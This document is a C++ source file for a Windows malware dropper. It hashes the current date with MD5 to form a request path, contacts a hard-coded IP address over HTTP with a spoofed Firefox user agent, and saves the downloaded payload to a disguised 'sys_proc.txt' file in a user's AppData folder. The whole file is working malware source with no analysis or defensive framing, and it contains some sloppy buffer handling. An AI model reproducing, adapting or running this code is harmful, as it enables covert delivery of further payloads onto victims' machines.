/*
 *  g++ -o dropper.exe dropper.cpp
 */
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <WinBase.h>
#include <stdio.h>
#include <typeinfo> //typeid to identify variable types (debugging)
#include <winhttp.h>
#include <fstream>
#include <Wincrypt.h>

wchar_t* md5sum(BYTE* input) {
    DWORD status, hash_len = 16;
    HCRYPTPROV provider = 0;
    HCRYPTHASH hasher = 0;
    BYTE hash[16];

    // get handle to the crypto provider
    if (!CryptAcquireContext(&provider,
        NULL,
        NULL,
        PROV_RSA_FULL,
        CRYPT_VERIFYCONTEXT))
    {
        printf("CryptAcquireContext failed: %d\n", GetLastError());
    }

    // create MD5 hasher
    if (!CryptCreateHash(provider, CALG_MD5, 0, 0, &hasher))
    {
        printf("CryptAcquireContext failed: %d\n", GetLastError());
        CryptReleaseContext(provider, 0);
    }

    // hash input data
    if (!CryptHashData(hasher, input, 16, 0)
    )
    {
        printf("CryptHashData failed: %d\n", GetLastError());
        CryptDestroyHash(hasher);
        CryptReleaseContext(provider, 0);
    }

    // get hash result
    if (!CryptGetHashParam(
        hasher, HP_HASHVAL, hash, &hash_len, 0
    )) 
    {
        printf("CryptGetHashParam failed: %d\n", GetLastError());
    }

    // convert md5sum to char*
    char hexstr[33];
    hexstr[32] = 0;
    for (int i = 0; i < 16; i++) {
        //printf("%02x", hash[i]);
        sprintf(hexstr + i * 2, "%02x", hash[i]);
    }

    // convert char* to LPWSTR                            
    wchar_t* wide_hexstr = new wchar_t[33];
    MultiByteToWideChar(CP_ACP, 0, hexstr, -1, wide_hexstr, 33);

    // check for consistency:
    //printf("%s\n", hexstr);
    //wprintf(L"%s\n", wide_hexstr);

    // destroy hasher and provider
    if (hasher)
        CryptDestroyHash(hasher);
    if (provider)
        CryptReleaseContext(provider, 0);

    return wide_hexstr;
}

void dropper(wchar_t* path) {
    // CONNECT TO SERVER TO DOWNLOAD FILE
    HINTERNET hsession = NULL,
        hconnect = NULL,
        hrequest = NULL;

    // open http session
    LPCWSTR agent = L"Mozilla / 5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko / 20100101 Firefox / 89.0";
    hsession = WinHttpOpen(agent,
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    // report any errors
    if (!hsession) {
        printf("Error %d has occurred.\n", GetLastError());
        exit(1);
    }

    // connect to http server 
    LPCWSTR ip = L"143.244.157.75";
    hconnect = WinHttpConnect(hsession, ip, INTERNET_DEFAULT_HTTP_PORT, 0);

    // report any errors
    if (!hconnect) {
        printf("Error %d has occurred.\n", GetLastError());
        exit(1);
    }

    // open request to provided path
    wchar_t* new_path = new wchar_t[34];
    new_path[0] = L'/';
    memcpy(&new_path[1], path, 66);
    //wprintf(L"Path: %s\n", path);
    //wprintf(L"%s\n", new_path);
    hrequest = WinHttpOpenRequest(hconnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    // report any errors
    if (!hrequest) {
        printf("Error %d has occurred.\n", GetLastError());
        exit(1);
    }

    // send request 
    bool results;
    results = WinHttpSendRequest(hrequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    // report any errors.
    if (!results) {
        printf("Error %d has occurred.\n", GetLastError());
        exit(1);
    }
    // end request and prepare to receive response
    results = WinHttpReceiveResponse(hrequest, NULL);

    // report any errors.
    if (!results) {
        printf("Error %d has occurred.\n", GetLastError());
        exit(1);
    }

    // check for 200 status code 
    DWORD sc = 0;
    DWORD dwSize = sizeof(sc);
    WinHttpQueryHeaders(hrequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &sc,
        &dwSize, WINHTTP_NO_HEADER_INDEX);

    if (sc != 200) {
        exit(1);
    }

    // parse response and save to file 
    DWORD size, downloaded;
    LPSTR buffer;
    std::ofstream file_out;
    file_out.open("C:\\Users\\Ian\\AppData\\Roaming\\sys_proc.txt");

    if (file_out.fail()) {
        printf("file failed to open\n");
        exit(1);
    }

    do
    {
        // check for available data
        size = 0;
        if (!WinHttpQueryDataAvailable(hrequest, &size)) {
            printf("Error %u in WinHttpQueryDataAvailable.\n",
                GetLastError());
            exit(1);
        }

        // allocate buffer
        buffer = new char[size + 1];
        if (!buffer)
        {
            printf("Out of memory\n");
            size = 0;
            exit(1);
        }
        else
        {
            // zero buffer read the data
            ZeroMemory(buffer, size + 1);
            if (!WinHttpReadData(hrequest, (LPVOID)buffer,
                size, &downloaded))
                printf("Error %u in WinHttpReadData.\n", GetLastError());
            else {
                //printf("%s", buffer);
                file_out.write(buffer, size);
            }

            // free the memory allocated to the buffer
            delete[] buffer;
        }
    } while (size > 0);

    // close any open handles
    file_out.close();
    if (hrequest) WinHttpCloseHandle(hrequest);
    if (hconnect) WinHttpCloseHandle(hconnect);
    if (hsession) WinHttpCloseHandle(hsession);
}

int main() {

    // get system time
    SYSTEMTIME system_time;
    GetSystemTime(&system_time);

    //if (system_time.wMonth == 7 && system_time.wYear == 2021) {
    //    exit(0);
    //}

    // concatenate data in single byte array
    DWORD dow = system_time.wDayOfWeek;
    DWORD mon = system_time.wMonth;
    DWORD yr = system_time.wYear;
    DWORD day = system_time.wDay;

    BYTE byte_array[sizeof(DWORD) * 4];
    memcpy(byte_array, &dow, sizeof(DWORD));
    memcpy(&byte_array[4], &mon, sizeof(DWORD));
    memcpy(&byte_array[8], &yr, sizeof(DWORD));
    memcpy(&byte_array[12], &day, sizeof(DWORD));

    // confirm correct allocation
    //printf("%d %d %d %d\n", dow, mon, yr, day
    //printf("%08x\n", dow);
    //printf("%08x\n", mon);
    //printf("%08x\n", yr);
    //printf("%08x\n", day);
    //for (int j = 0; j < 16; j++)
    //    printf("%02x ", byte_array[j]);

    // get md5 conversion of the above date values
    wchar_t* path = md5sum(byte_array);
    //wprintf(L"Path: %s\n", path);

    // get executable from server
    dropper(path);

}